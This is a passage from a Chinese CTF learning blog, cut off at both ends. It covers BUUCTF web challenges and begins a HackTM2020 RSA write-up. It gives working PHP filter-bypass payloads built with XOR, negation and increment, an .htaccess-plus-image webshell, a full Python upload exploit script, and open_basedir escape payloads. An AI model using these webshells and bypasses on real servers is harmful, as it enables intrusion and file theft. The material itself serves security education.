<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;ff=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure>
<p>抛开这道题，还可以类似这样地使用：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/?<span class="number">_</span>=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(<span class="string">"type index.php"</span>);&amp;%ff=<span class="keyword">system</span>。</span><br></pre></td></tr></table></figure>
<p>最后的exp:</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);</span><br><span class="line">\\assert</span><br><span class="line">$b = <span class="string">"_"</span> . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;</span><br><span class="line">\\$b = $_POST</span><br><span class="line">$a($c[<span class="number">777</span>]);</span><br></pre></td></tr></table></figure>
<p><strong>2、取反构造</strong><br>与<code>方法1</code>有异曲同工之妙，唯一差异就是，<code>方法1</code>使用的是位运算里的<code>异或</code>，本方法使用的是位运算里的<code>取反</code>。<br>本方法利用的是<code>UTF-8</code>编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>\x8c</code>，其取反即为字母<code>s</code>，还有一些其他的如下图：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web71.jpg" alt=""><br>图片来源于P神的那篇文章。<br>当然，在这道题里已经过滤了数字，那怎么来构造<code>{}</code>中的数字呢？<br>这个可以利用PHP的弱类型特性：<code>true</code>的值为<code>1</code>，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。<br>然后便可以一步一步构造即可。<br>后面有一篇博客里<code>[SUCTF 2018]GetShell</code>这道题用到了这个知识点。<br><strong>3、自增构造</strong><br>参考<a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a><br>可以了解到<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得<code>a-z</code>中所有字符。<br>那如何获取<code>a</code>呢？<br>数组<code>Array</code>的第一个字母就是大写<code>A</code>，而且第4个字母是小写<code>a</code>。利用它可以同时拿到<code>a</code>和<code>A</code>，等于我们就可以拿到<code>a-z</code>和<code>A-Z</code>的所有字母了。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>，然后再取这个字符串的第一个字符就是<code>A</code>了，同理获取<code>a</code>。<br>还可以利用下面的方式来获取：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">B</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"HI!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__= <span class="string">"?"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line">    $__();</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1、<code>$_++;</code>这行代码的意思是对变量名为<code>_</code>的变量进行自增操作，在PHP中未定义的变量默认值为<code>null</code>，<code>null==false==0</code>，我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字；<br>2、<code>$__=&quot;?&quot; ^ &quot;}&quot;;</code>对字符<code>?</code>和<code>}</code>进行异或运算，得到结果<code>B</code>赋给变量名为<code>__</code>的变量；<br>3、<code>$__();</code>通过上面的赋值操作，变量<code>$__</code>的值为<code>B</code>，所以这行可以看作是<code>B()</code>,在PHP中,这行代码表示调用函数<code>B</code>,所以执行结果为<code>HI!</code>,在PHP中，我们可以将字符串当作函数来处理。</p>
</blockquote>
<p>想要更深的了解，参考前面的链接。</p>
<h4 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h4><p><strong>关于解析</strong><br>之前讲过一个借用<code>.user.ini</code>解析来上传小马的，这里再扩展一下：</p>
<blockquote>
<p>nginx的服务器，而且上传目录下有一个php文件，所以上传.user.ini<br>apache的服务器，应该上传.htaccess</p>
</blockquote>
<p><code>.user.ini</code>的已经讲过了，这里讲一下<code>.htaccess</code>：上传的时候不能用<code>GIF89a</code>等文件头去绕过<code>exif_imagetype</code>,因为这样虽然能上传成功，但<code>.htaccess</code>文件无法生效。这时有两个办法:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure>
<p><code>#</code>在<code>.htaccess</code>是注释符，所以<code>.htaccess</code>文件可以生效。同时在<code>.htaccess</code>前添加<code>x00x00x8ax39x8ax39</code>(要在十六进制编辑器中添加，或者使用<code>python</code>的<code>bytes</code>类型)，这里<code>x00x00x8ax39x8ax39</code>是wbmp文件的文件头，<code>.htaccess</code>中以<code>0x00</code>开头的同样也是注释符，所以不会影响<code>.htaccess</code>。<br><strong>对&lt;?过滤的绕过</strong><br>对<code>&lt;?</code>绕过的一般可以借用<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>来绕过，但是当PHP的版本是<code>7</code>以上的时候，本方法不可用了，此时需要用另一种方法：<strong>可以通过编码进行绕过，如原来使用utf-8编码，如果shell中是用utf-16编码则可以Bypass</strong>。<br>在本题中的用法后面再讲。</p>
<h4 id="绕过open-basedir-disable-function"><a href="#绕过open-basedir-disable-function" class="headerlink" title="绕过open_basedir/disable_function"></a>绕过open_basedir/disable_function</h4><p><code>open_basedir</code>是<code>php.ini</code>中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。<br>假设<code>open_basedir=/home/wwwroot/home/web1/:/tmp/</code>，那么通过web1访问服务器的用户就无法获取服务器上除了<code>/home/wwwroot/home/web1/</code>和<code>/tmp/</code>这两个目录以外的文件。<br>注意用<code>open_basedir</code>指定的限制实际上是前缀，而不是目录名。举例来说: 若<code>open_basedir = /dir/user</code>, 那么目录<code>/dir/user</code>和<code>/dir/user1</code>都是可以访问的，所以如果要将访问限制在仅为指定的目录，注意<strong>用斜线结束路径名</strong>。<br>更多的可以参考<a href="https://xz.aliyun.com/t/4720">这里</a>。</p>
<h3 id="解题-14"><a href="#解题-14" class="headerlink" title="解题"></a>解题</h3><p>进入题目看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，代码主要分为两部分：<code>get_the_flag()</code>和各种过滤的代码(主要是为了调用<code>get_the_flag()</code>)。<br>可以利用下面的代码fuzz一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[x00- 0-9A-Za-z'</span><span class="string">"`~_&amp;.,|=[x7F]+/i', chr($i))) &#123;</span></span><br><span class="line"><span class="string">        echo urlencode(chr($i)).' ';</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>获取到没有被ban的字符：</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">! # $ % ( ) * + - / : ; <span class="tag">&lt; &gt;</span> ? @ ] ^ </span><span class="template-variable">&#123; &#125;</span></span><br></pre></td></tr></table></figure>
<p>参考前面讲的拿webshell的三种方法，这里取反符号<code>~</code>直接被禁掉了，<code>自增</code>需要用到变量长度会很长,因此尝试使用<code>异或</code>，因为有长度的限制，所以可以去凑出类似<code>$_GET{x}();</code>然后传入<code>x=get_the_flag</code>调用函数。<br>利用下面的脚本来构造：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure>
<p>拿到payload：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">?_=$&#123;<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe^<span class="meta">%</span>a<span class="number">1</span><span class="meta">%</span>b<span class="number">9</span><span class="meta">%</span>bb<span class="meta">%</span>aa&#125;&#123;<span class="meta">%</span>fe&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>fe=get_the_flag</span><br></pre></td></tr></table></figure>
<p>再看<code>get_the_flag</code>的代码，发现是一个上传，从代码可以看出，对<code>ph</code>、<code>&lt;?</code>、文件的类型都做了判断。<br>那只能上传图片马了，但是还需要上传解析图片马的文件，该题的环境是<code>apache</code>，因此需要上传<code>.htaccess</code>，构造的方法前面也讲过了。<br>现在讲一下<code>.htaccess</code>构造的内容，这里将一句话进行base64编码，然后在<code>.htaccess</code>中利用php伪协议进行解码，内容如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">#def</span>ine <span class="attribute">width</span> <span class="number">1337</span></span><br><span class="line"><span class="number">#def</span>ine <span class="attribute">height</span> <span class="number">1337</span> </span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg"</span></span><br></pre></td></tr></table></figure>
<p>shell.jpg内容：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/<span class="attribute">Pg</span>==</span><br></pre></td></tr></table></figure>
<p>参考大佬的一个完整的上传脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://300a73e6-9981-40dd-b39a-cdf1584e3ba2.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web72.png" alt=""><br>然后访问<code>?a=phpinfo();</code>发现存在<code>open_basedir</code>和<code>disable_functions</code>的限制，参考前面讲到的知识，构造最终payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web73.png" alt=""><br>找到flag文件<code>THis_Is_tHe_F14g</code>，然后构造payload拿flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web74.png" alt=""><br>偶然发现，其实这个题不去绕过<code>open_basedir</code>和<code>disable_functions</code>的限制，直接访问<code>phpinfo()</code>就有flag…<br><img src="http://www.ggb0n.cool/images/BUUCTF-web75.png" alt=""></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF学习记录</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/">BUU刷题</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/RCE/">RCE</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Cookie%E6%94%BB%E5%87%BB/">Cookie攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/INDA%E6%BC%8F%E6%B4%9E/">INDA漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/HTTP%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">HTTP请求伪造</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">堆叠注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Python反序列化漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Unicode%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">Unicode安全问题</a><span> </span><a class="article-more button is-small link-muted" href="/tags/JWT%E4%BC%AA%E9%80%A0/">JWT伪造</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E8%96%85%E7%BE%8A%E6%AF%9B%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">薅羊毛逻辑漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/MD5%E5%BC%BA%E6%AF%94%E8%BE%83/">MD5强比较</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">无参数RCE</a><span> </span><a class="article-more button is-small link-muted" href="/tags/open-basedir%E7%BB%95%E8%BF%87/">open-basedir绕过</a><span> </span><a class="article-more button is-small link-muted" href="/tags/htaccess%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">htaccess上传漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%B7%A7%E5%8F%96webshell/">巧取webshell</a><span> </span><a class="article-more button is-small link-muted" href="/tags/bypass-functions-disable/">bypass functions_disable</a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-04T15:21:15.000Z">2020-02-04</time><span class="level-item">31 minutes read (About 4590 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/04/HackTM2020-WriteUp/">HackTM2020-WriteUp</a></h1><div class="content"><h2 id="HackTM2020-WriteUp"><a href="#HackTM2020-WriteUp" class="headerlink" title="HackTM2020-WriteUp"></a>HackTM2020-WriteUp</h2><p>假期被“关禁闭”，看到战队发的比赛链接，虽然知道自己很菜，题目不是我可以做的，不过还是大胆尝试了，发现一些题目还比较简单[滑稽脸]，这里写一下部分题目的WP。</p>
<h3 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA#1"></a>RSA#1</h3><p>这是一个简单的RSA爆破题。</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目给了两个附件：<code>c</code>、<code>rsa.py</code>，其中<code>c</code>的内容如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Public key:</span><br><span class="line">(<span class="number">65537</span>, <span class="number">28150970547901913019901824364390497053600856369839321617996700606130553862041378369018779003752433356889118526332329074054728613209407037089320809898343953157935211086135010436283805891893636870991411236307901650696221491790470635225076251966300189483160148297407974155121570252648252906976186499329924342873</span>)</span><br><span class="line"></span><br><span class="line">Encrypted flag:</span><br><span class="line">[<span class="number">24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">15645290594995180815865397749136800126080704684884296404807344870555186823350216705796063922278419585484662234210001661578549560411864952462380096494781766394542247609648743673312823946783517115542404474786395934886667795692210287283039316418126796934535150832709500306153601987121172178183970841498331059732</span>, <span class="number">24345863558959407738249127568820138362115734211146549194534219311913032290216606859385934708675962835857804566049600710875035366973110422262131331932310524891713319358676673958738776644229757625523955354996402750265022578843637525183704187498194489645838490640529841182709661371499013082259193633000753627261</span>, <span class="number">9620679224297488175028367924764722982789333194446063577221477359704180638294602848741035585656113543497776415635770748468725814916994577398023154224563920936523717884116880223345204061598438291740007518025998041449406726084042681798053863495542392481059281588020105313791046017356493739244555377217866496734</span>, <span class="number">1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279</span>, <span class="number">20629854768856798537062426042570334097651328955665698429979954410631113160492201197690192324881508105172595216229624523572595589920695165876501026993810936392510720968159305964832449680889041278532807173859579419197780294984519222830572413180237776797800176462492384318120546495539728732366110782215071262307</span>, <span class="number">7440918084186181327822271261394344901791253526257166181264874776746516620936925799031445704193589071453959493392065321806281801023425299535553522582376879027448581379760896052013060957519595664095702210758316558762834545655992756483227787274192094065257224706388623944855362716578806372564148647945479173348</span>, <span class="number">5097867843777034076271397095201528351784693372027998615436445410912131141882225577577253530396333413579756394884096318434100382509189974240357351425474190558456256750742731090012822064840481143528081027106843123030275420215136304130321013605031261372665636366377162666476737296028608455229357416005773064242</span>, <span class="number">10420107412794383499391199999666100864853724770814620968725971207705900061273163202891569477729023724554388008575891113425781557296798472693974759813058067631655217722786373465395279381307973425004404348124524059844749313287030234750535347511172780349725636807760402334957881556461382950021814486095167001394</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">16657126895659048065404729920028465477385009450133540950695155983380795627778054526133891673615252510518969355629562948102050307259107355106086468465392660721567070464708776158039303608428552547481825035736610837329720474688421062759594907620576318249542577396722737724172954532394471909440668625218820801756</span>, <span class="number">11113777356910731413424023299582648618258376222028450254478672148119889617557563576704932635131420845868165014982665717620845578039880527701593963719893467068820107811384041511295664833904504511210342105242330522375476482706044695838957591685781703894244561607764476555630573446589408768780659378128082633769</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279</span>, <span class="number">5237767970074646857079948735567615361735616179074197239639640947679550920349684166643572837235712904929824521258264241503059989875517915784117038966236672390569320206379357882906463342282254405974383459878863044723383164329146669331810709270455492110346838097216174137176255793792848357953314563364460847842</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670</span>, <span class="number">278354276293884030290100330445865286604723740111170856624965259573282278044823323212960304154629174664076141280100412502135750130875356944835909175355370317285768658282746817782130476757714384697086179400629156643250500432197002583758692394681401772203578628635926749457621478296182304772136118691761841359</span>, <span class="number">6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542</span>, <span class="number">21353765873487781085375016306418205544750755310255410963646737671193146222650262290683259548572190880304009015662963424520575937651278866672082973874806201031606257157229306007587966460187818647603633973019548401357989358306250139692325474674826791149726161678649996852062656272851387461089863388359261125336</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">20576388598886140095325204584799302384454378372204683348252463729525849583734948105765087991438423260690623246579570440405616572326057536248148020737810766134083795050076636686776809469271643188562482921546497071402873405706504773345621716428511481598704631451463399778602486417840466985891815649711178813963</span>, <span class="number">17347447662661486040040289855519394974371562320877472776529836975445205017304164550202099250096382852783253959549113036367974281750823938616836362593312254792770954856762797438690474329666549947795964992533463700161635382925555835347885819042031312006167190561233042383984087765920275010577545908085026177611</span>, <span class="number">11788628214684738246695632901992250075758959059858474645166125685861157046466064692980236734739634298802473894878268029860203026238925142258303727438570051822763330338744774300757888262747314093511013562545738571326771345495509434761853742569509480619380000424215527153118231084573851377049921456961916278761</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670</span>, <span class="number">2710029303357232932696197225263692040597986927359269224740812600224998707144266259851604978553286889767425982708691908438984279442981540971935737617354609856642312100797081348174935195638083002333058089328102430432526612805955273581245352312630845237670744276402867230550537275379675828467791243032108754996</span>, <span class="number">19981107233593350929447953514006501458466479260151660185153999799085657467921097940751860717309377498501638075002136637344148955811617399850718322497572421311807629329642551519284713638882025500074565475569618691516951449764680555447185364165687596161053684299589053909233984617244886185728811651967713024530</span>, <span class="number">3975884358027162862622932959187611984655247354547659825042810425039322096401899672988989768997134724085482147901304365437476311647149733392577446833370358728610677436154877051592307539990184750467273668379065865808900410057533079113476991204462719784464847498582643056503810805516315622314948257403761762299</span>, <span class="number">6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542</span>, <span 